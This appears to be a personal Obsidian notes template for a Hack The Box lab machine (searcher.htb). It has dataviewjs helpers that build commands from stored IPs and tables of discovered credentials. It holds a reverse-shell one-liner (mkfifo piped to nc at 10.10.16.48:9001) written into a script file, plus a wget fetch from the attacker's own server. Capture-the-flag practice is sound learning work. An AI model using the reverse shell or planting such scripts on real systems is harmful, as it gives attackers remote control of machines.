[IP]
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Editing Box

```
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.48 9001 >/tmp/f" > /tmp/full-checkup.sh
```

wget from local python server

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```


## Provided Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---


## Open Ports
---

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

---

## Discovered Subdomains
---

http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
---

## Discovered Credentials
---

| Username | Password            | Notes |
| -------- | ------------------- | ----- |
| <br>     | jh1usoih2bkjaspwe92 |       |
| cody     | jh1usoih2bkjaspwe92 |       |
| gitea    | yuiu1hoiu4i5ho1uh   |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```